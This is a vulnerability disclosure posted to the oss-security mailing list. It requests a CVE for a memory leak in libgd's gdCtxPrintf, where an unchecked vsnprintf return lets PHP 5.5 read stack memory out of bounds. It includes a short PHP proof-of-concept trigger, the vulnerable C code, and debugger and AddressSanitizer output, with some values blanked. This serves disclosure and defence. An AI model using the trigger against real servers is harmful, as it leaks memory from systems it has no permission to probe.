  oss-security - CVE Request: libgd - gdCtxPrintf memory leak            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Sun, 29 May From: Fernando MuĂąoz <fernando@...l-life.com> To: oss-security@...ts.openwall.com Subject: CVE Request: libgd - gdCtxPrintf memory leak  libgd report:  PHP report: - password  Fix:  Credit: Fernando MuĂąoz and Marcelo Echeverria  While creating an XBM image (imagexbm) with an user supplied name, libgd isn't checking the vsnprintf return value and PHP 5.5 will trust this length and read more memory than it should, causing a read-out-of boundaries, leaking stack memory.  vsnprintf man: "a return value of size or more means that the output was truncated".  PHP devs marked it as a "not a bug" because the bundled version of libgd with PHP 5.5 is not vulnerable, however using PHP with systemwide libgd is a common practice. PHP 5.6 and PHP 7 are not vulnerable to this issue because another bugfix prevents this from being exploited [1].  Test script (PHP 5.5 and systemwide libgd): <?php $var1=imagecreatetruecolor ( 2 , 2); $var2=str_repeat("ABCD", imagexbm($var1, $var2, 0);   Affected code: /* {{{ gdCtxPrintf */ static void gdCtxPrintf(gdIOCtx * out, const char *format, ...) {     char     int len;     va_list args;      va_start(args, format);     len = vsnprintf(buf, sizeof(buf)-1, format, args);      // -----> if len > data was truncated      // -----> but libgd returns this value as is     va_end(args);     out->putBuf(out, buf, len); }   Debug: (gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/user/php/php-55/sapi/cli/php -n -dextension=/home/user/php/php-55/modules/gd.so /home/user/img.php [Thread debugging using libthread_db enabled] Using host libthread_db library  Breakpoint 1, _php_image_output_putbuf at 39              return php_write((void *)buf, l TSRMLS_CC); (gdb) print l $7 =  PHP will use as string length.  ASAN: #define ABCD... <random stuff from memory> ... ============================================== ERROR: AddressSanitizer: stack-buffer-underflow on address at pc bp sp 0xbfff9fdc READ of size at thread T0                                        #0     #1 in sapi_cli_single_write   [1]  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      